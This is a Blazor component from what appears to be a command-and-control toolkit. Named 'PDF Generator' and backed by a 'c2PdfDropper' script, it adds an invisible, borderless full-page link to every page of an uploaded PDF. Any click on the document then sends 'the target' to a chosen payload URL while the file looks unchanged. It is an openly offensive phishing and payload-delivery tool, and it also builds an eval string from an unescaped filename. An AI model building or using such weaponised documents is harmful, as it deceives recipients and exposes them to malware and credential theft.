@inject IJSRuntime JS

<div class="tool-panel">
    <div class="tool-header">
        <h3 class="tool-title">PDF Generator</h3>
        <p class="tool-subtitle">Inject invisible link overlays into PDF documents — clicking anywhere opens the target URL.</p>
    </div>

    <div class="loader-content">
        <div class="loader-section">
            <h4 class="loader-section-title">Overview</h4>
            <p class="loader-text">
                Adds a transparent full-page link annotation to every page of an existing PDF.
                The annotation triggers a URI action when clicked — no visual change to the document.
                Works in all major PDF readers (Adobe Acrobat, Foxit, browser viewers).
            </p>
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">1 — Target URL</h4>
            <p class="loader-text loader-hint">
                URL opened when the target clicks anywhere on any page of the PDF.
            </p>
            <C2InputActions Value="@_url" ValueChanged="v => _url = v" Monospace BindOnInput
                            Placeholder="https://example.com/payload" />
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">2 — Output</h4>
            <p class="loader-text loader-hint">
                Upload a PDF document. Each page will receive a transparent clickable overlay linking to the target URL.
            </p>
            <div class="loader-actions">
                <label class="loader-link-btn" style="cursor:pointer">
                    <C2Icon Name="upload" Size="Size.Xs" /> Upload PDF
                    <InputFile OnChange="OnPdfUpload" accept=".pdf" style="display:none" />
                </label>
                @if (!string.IsNullOrEmpty(_fileName))
                {
                    <span class="loader-text">@_fileName (@_pageCount pages)</span>
                }
            </div>
            @if (_pdfBase64 is not null)
            {
                <div class="loader-actions">
                    <button class="loader-link-btn" @onclick="Generate" disabled="@(string.IsNullOrWhiteSpace(_url) || _generating)">
                        @if (_generating)
                        {
                            <C2Spinner Size="Size.Xs" />
                            <span>Generating…</span>
                        }
                        else
                        {
                            <C2Icon Name="download" Size="Size.Xs" />
                            <span>Download Injected PDF</span>
                        }
                    </button>
                </div>
            }
            @if (!string.IsNullOrEmpty(_error))
            {
                <p class="loader-text" style="color:var(--c2-accent-red)">@_error</p>
            }
        </div>

        <div class="loader-section">
            <h4 class="loader-section-title">How It Works</h4>
            <p class="loader-text">
                1. Target opens the PDF in any reader<br/>
                2. Every page has an invisible <code>PdfLinkAnnotation</code> covering the full page area<br/>
                3. Clicking anywhere triggers a <code>URI</code> action → default browser opens the URL<br/>
                4. The border is invisible and highlight mode is <code>NONE</code> — document looks untouched<br/>
                5. Works across Adobe Acrobat, Foxit, Chrome, Edge, and Preview
            </p>
        </div>
    </div>
</div>

@code {
    private string _url = "";
    private string _fileName = "";
    private string _error = "";
    private string? _pdfBase64;
    private int _pageCount;
    private bool _generating;

    private async Task OnPdfUpload(InputFileChangeEventArgs e)
    {
        var file = e.File;
        if (file is null) return;

        _fileName = file.Name;
        _error = "";

        using var stream = file.OpenReadStream(maxAllowedSize: 50 * 1024 * 1024);
        using var ms = new MemoryStream();
        await stream.CopyToAsync(ms);
        _pdfBase64 = Convert.ToBase64String(ms.ToArray());

        try
        {
            var info = await JS.InvokeAsync<PdfInfo>("c2PdfDropper.info", _pdfBase64);
            if (info.Error is not null)
            {
                _error = info.Error;
                _pdfBase64 = null;
                _pageCount = 0;
            }
            else
            {
                _pageCount = info.PageCount;
            }
        }
        catch (Exception ex)
        {
            _pageCount = 0;
            _error = $"Could not read PDF: {ex.Message}";
            _pdfBase64 = null;
        }

        StateHasChanged();
    }

    private async Task Generate()
    {
        if (_pdfBase64 is null || string.IsNullOrWhiteSpace(_url)) return;
        _error = "";
        _generating = true;
        StateHasChanged();

        try
        {
            var resultBase64 = await JS.InvokeAsync<string>("c2PdfDropper.injectLinkAnnotation", _pdfBase64, _url.Trim());
            var outName = System.IO.Path.GetFileNameWithoutExtension(_fileName) + "_gen.pdf";
            await JS.InvokeVoidAsync("eval", $@"
                (function() {{
                    var a = document.createElement('a');
                    a.href = 'data:application/pdf;base64,{resultBase64}';
                    a.download = '{outName}';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                }})()
            ");
        }
        catch (Exception ex)
        {
            _error = $"Generation failed: {ex.Message}";
        }
        finally
        {
            _generating = false;
            StateHasChanged();
        }
    }

    private record PdfInfo(int PageCount, string? Error);
}
